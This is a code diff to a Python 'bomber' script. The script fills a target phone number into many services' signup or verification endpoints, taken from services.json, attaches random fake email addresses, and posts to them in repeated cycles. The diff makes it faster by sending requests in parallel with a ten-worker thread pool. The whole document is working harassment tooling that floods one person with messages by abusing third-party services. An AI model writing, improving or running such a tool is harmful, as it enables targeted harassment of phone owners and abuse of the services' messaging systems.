@@ -5,6 +5,7 @@ import requests                  # main lib
 import random                    # mail generating
 import string                    # mail generating
 from colorama import Fore        # color
+import concurrent.futures
 
 with open(r'services.json', encoding="utf8") as js:      # load services to dict from services.json
     services = json.load(js)
@@ -59,47 +60,55 @@ print(f'\n[#] Services: {len(services)}')
 print('[#] Starting bomber!')
 time.sleep(3)
 
-successfull = 0
 
-for i in range(1, cyc+1):
-    os.system('cls')
-    logo()
-    print(f'\n[#] Cycle: {i}')
-    for service in services:
-        time.sleep(0.1)
-        cur_service = services[service]   
+def send_request(service):
+    cur_service = services[service]
 
+    ## formatting phone by mask ##
+    json_data = cur_service['request_data']  
+    phone_key_name = cur_service['service_data']["phone_key"] 
+    formatted_phone = cur_service['service_data']['phone_mask'].replace('*code*', code).replace('*seg_1*', seg_1).replace('*seg_2*', seg_2).replace('*seg_3*', seg_3)
+    json_data[phone_key_name] = formatted_phone   # change phone to masked phone
 
-        ## formatting phone by mask ##
-        json_data = cur_service['request_data']  
-        phone_key_name = cur_service['service_data']["phone_key"] 
-        formatted_phone = cur_service['service_data']['phone_mask'].replace('*code*', code).replace('*seg_1*', seg_1).replace('*seg_2*', seg_2).replace('*seg_3*', seg_3)
-        json_data[phone_key_name] = formatted_phone   # change phone to masked phone
+    ## formatting email ##
+    if cur_service['service_data']['email_key'] != '':
+        json_data[cur_service['service_data']['email_key']] = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(6, 13))) + '@gmail.com'
 
+    ## sending request ##
+    try:
+        r = requests.post(
+            url = cur_service['service_data']['link'],
+            json=json_data,
+            timeout=6
+        )
+        if r.status_code == 200:
+            print(Fore.GREEN + f'[  +  ] {service}' + Fore.RESET)
+            return True
+        else:
+            print(Fore.RED + f'[ {r.status_code} ] {service}' + Fore.RESET)
+            return False
 
-        ## formatting email ##
-        if cur_service['service_data']['email_key'] != '':
-            json_data[cur_service['service_data']['email_key']] = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(6, 13))) + '@gmail.com'
+    except Exception as e:
+        print(Fore.RED + f'[ TME ] {service}' + Fore.RESET)
+        return False
 
+if __name__ == '__main__':
+    successfull = 0
 
-        ## sending request ##
-        try:
-            r = requests.post(
-                url = cur_service['service_data']['link'],
-                json=json_data,
-                timeout=6
-            )
-            if r.status_code == 200:
-                print(Fore.GREEN + f'[  +  ] {service}' + Fore.RESET)
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+        future_to_service = {}
+        for i in range(1, cyc+1):
+            for service in services:
+                future = executor.submit(send_request, service)
+                future_to_service[future] = service
+
+        for future in concurrent.futures.as_completed(future_to_service):
+            service = future_to_service[future]
+            if future.result():
                 successfull += 1
-            else:
-                print(Fore.RED + f'[ {r.status_code} ] {service}' + Fore.RESET)
 
-        except Exception as e:
-            print(Fore.RED + f'[ TME ] {service}' + Fore.RESET)
-
-print(Fore.GREEN + '\n[#] Done!' + Fore.RESET)
-time.sleep(3)
+    print(Fore.GREEN + '\n[#] Done!' + Fore.RESET)
+    time.sleep(3)
 
 os.system('cls')
 logo()
